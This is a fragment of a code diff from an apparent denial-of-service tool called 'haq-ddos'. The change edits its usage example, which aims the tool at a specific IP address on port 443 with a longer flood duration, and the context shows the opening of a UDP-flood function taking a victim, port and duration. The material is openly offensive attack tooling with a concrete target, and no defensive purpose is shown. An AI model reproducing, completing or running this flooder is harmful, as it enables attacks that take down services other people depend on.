@@ -18,7 +18,7 @@ time.sleep(3)
 def usage():
 	os.system("figlet haq-ddos")
 	print ("Tool Created By White Tiger")
-        print ("Usage : python3 haqddos.py 196.220.60.200 443 1000")
+    print ("python3 haqddos.py 196.220.60.200 443 3000")
 
 def flood(victim, vport, duration):
     client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
